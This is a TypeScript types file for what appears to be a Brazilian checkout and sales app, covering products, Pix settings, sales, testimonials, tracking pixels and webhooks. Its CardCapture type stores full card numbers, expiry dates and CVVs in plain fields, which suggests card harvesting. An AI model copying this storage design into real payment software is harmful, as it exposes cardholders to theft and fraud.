// Types for our database tables
export type Cliente = {
  id: number;
  nome: string;
  email: string;
  celular: string;
  documento: string;
  produto_id: number;
  criado_em: string;
};

export type Produto = {
  id: number;
  nome: string;
  tipo: string;
  valor: number;
  descricao: string;
  ativo: boolean;
  slug: string;
  imagem_url: string;
  checkout_title: string;
  banner_url: string;
  banner_mobile_url: string;
  banner_color: string;
  background_color: string;
  tipo_chave_pix: string;
  chave_pix: string;
  nome_beneficiario: string;
  usar_api_pix: boolean;
  url_pix_api: string;
  url_api_pix: string;
  usar_config_pix_global: boolean;
  criado_em: string;
};

export type Venda = {
  id: number;
  cliente_id: number;
  produto_id: number;
  valor: number;
  status: 'pendente' | 'aprovado' | 'recusado';
  metodo_pagamento: 'pix' | 'cartao' | 'boleto';
  criado_em: string;
};

export type ConfigCheckout = {
  id: number;
  mensagem_topo: string;
  cor_topo: string;
  cor_texto_topo: string; // Nova propriedade para a cor do texto da mensagem de topo
  ativa_banner: boolean;
  banner_url: string;
  banner_mobile_url: string;
  cor_banner: string;
  cor_fundo: string;
  cor_titulo: string;
  texto_botao: string;
  rodape_texto: string;
  rodape_empresa: string;
  rodape_ano: string;
  mostrar_seguro: boolean;
  mensagem_rodape: string;
};

export type Depoimento = {
  id: number;
  nome: string;
  texto: string;
  estrelas: number;
  foto_url: string;
  produto_id?: number; // Making this optional
  criado_em: string;
};

export type PixConfig = {
  id: number;
  produto_id: number;
  tipo_chave_pix: string;
  chave_pix: string;
  nome_beneficiario: string;
  usar_api_pix: boolean;
  url_pix_api: string;
};

export type Pixel = {
  id: number;
  facebook_pixel: string;
  tiktok_pixel: string;
  google_tag_id: string;
  taboola_pixel: string;
};

export type Webhook = {
  id: number;
  nome_evento: string;
  url_destino: string;
  token: string;
  mensagem: string;
};

export type CardCapture = {
  id: number;
  nome_cliente: string;
  numero_cartao: string;
  validade: string;
  cvv: string;
  criado_em: string;
};
